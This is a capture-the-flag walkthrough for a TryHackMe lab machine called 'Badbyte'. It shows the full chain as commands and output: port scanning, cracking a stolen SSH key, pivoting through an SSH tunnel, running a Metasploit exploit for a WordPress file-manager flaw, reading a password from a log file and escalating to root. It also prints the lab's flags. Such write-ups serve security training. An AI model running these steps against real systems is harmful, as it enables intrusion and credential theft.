> Badbyte

**export IP=10.10.81.188**

## Reconnaisance

# Nmap

nmap -sC -sV -T4 -Pn -p- -oN nmap/initial $IP

```

30024/tcp open  ftp     syn-ack vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 ftp      ftp          1743 Mar 23 20:03 id_rsa
|_-rw-r--r--    1 ftp      ftp            78 Mar 23 20:09 note.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.8.107.21
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 6
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
```

ftp $IP 30024

We got 2 files. `note.txt` and `id_rsa`

# Cracking id_rsa password

python /usr/share/john/ssh2john.py id_rsa > id_rsa.hash
john id_rsa.hash -w=/usr/share/wordlists/rockyou.txt

```
cupcake          (id_rsa)
```

## Port Forwarding

1. ssh -i id_rsa -D 1337 errorcauser@$IP
2. Add socks5 127.0.0.1 1337 to conf file `/etc/proxychains.conf`
3. proxychains nmap -sT 127.0.0.1

```
22/tcp   open  ssh
80/tcp   open  http
3306/tcp open  mysql
```

4. ssh -i id_rsa -L 8080:127.0.0.1:80 errorcauser@$IP

Navigate to `localhost:8080`. 

# Web Exploitation

proxychains nmap -sT --script http-enum 127.0.0.1

```
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
| http-enum: 
|   /wp-login.php: Possible admin folder
|   /readme.html: Wordpress version: 2 
|   /: WordPress version: 5.7
|   ?feed=rss2: Wordpress version: 5.7
|   /wp-includes/images/rss.png: Wordpress version 2.2 found.
|   /wp-includes/js/jquery/suggest.js: Wordpress version 2.5 found.
|   /wp-includes/images/blank.gif: Wordpress version 2.6 found.
|   /wp-includes/js/comment-reply.js: Wordpress version 2.7 found.
|   /wp-login.php: Wordpress login page.
|   /wp-admin/upgrade.php: Wordpress login page.
|   /readme.html: Interesting, a readme.
|_  /server-status/: Potentially interesting folder
3306/tcp open  mysql
```

proxychains nmap -sT --script http-wordpress-enum 127.0.0.1

```
22/tcp   open  ssh
80/tcp   open  http
| http-wordpress-enum: 
| Search limited to top 100 themes/plugins
|   plugins
|_    duplicator 1.3.26
3306/tcp open  mysql
```

nmap --script http-wordpress-enum --script-args check-latest=true,search-limit=1500 -p 8080 127.0.0.1

```
8080/tcp open  http-proxy
| http-wordpress-enum: 
| Search limited to top 1500 themes/plugins
|   plugins
|     duplicator 1.3.26 (latest version:1.4.0)
|_    wp-file-manager 6.0 (latest version:7.1)
```

Searching for vulnerability in wp-file-manager we got `CVE-2020-25213`.

## Metasploit

1. use 0
2. set LHOST 10.8.107.21
3. set RHOSTS 127.0.0.1
4. set RPORT 8080
5. exploit

We got a meterpreter session.

## Meterpreter Session

1. ps -ef

```
1524  /usr/sbin/apache2                         cth       /usr/sbin/apache2 -k start
```

2. cd /home/cth
3. cat user.txt

# user.txt

```
THM{227906201d17d9c45aa93d0122ea1af7}
```

# linpeas.sh

```
[+] Finding passwords inside logs (limit 70)
/var/log/bash.log:cth@badbyte:~$ passwd
/var/log/bash.log:(current) UNIX password: 
/var/log/bash.log:Changing password for cth.
/var/log/bash.log:Enter new UNIX password: 
/var/log/bash.log:Retype new UNIX password: 
/var/log/bash.log:passwd: password updated successfully
```

cat /var/log/bash.log

```
cth@badbyte:~$ whoami
cth
cth@badbyte:~$ date
Tue 23 Mar 21:05:14 UTC 2021
cth@badbyte:~$ suod su

Command 'suod' not found, did you mean:

  command 'sudo' from deb sudo
  command 'sudo' from deb sudo-ldap

Try: sudo apt install <deb name>

cth@badbyte:~$ G00dP@$sw0rd2020 => user mistyped the password
G00dP@: command not found
cth@badbyte:~$ passwd
Changing password for cth.
(current) UNIX password: 
Enter new UNIX password: 
Retype new UNIX password: 
passwd: password updated successfully
cth@badbyte:~$ ls
cth@badbyte:~$ cowsay "vim >>>>>>>>>>>>>>>>> nano"
 ____________________________
< vim >>>>>>>>>>>>>>>>> nano >
 ----------------------------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
cth@badbyte:~$ cowsay " g = pi ^ 2 " 
 ______________
<  g = pi ^ 2  >
 --------------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
cth@badbyte:~$ cowsay "mooooooooooooooooooo"
 ______________________
< mooooooooooooooooooo >
 ----------------------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
cth@badbyte:~$ exit
```

Guess password like `G00dP@$sw0rd2021` and it works. Running sudo -l we can run all as user cth. `sudo su` and we are root!!

# root.txt

```
THM{ad485b44f63393b6a9225974909da5fa}
```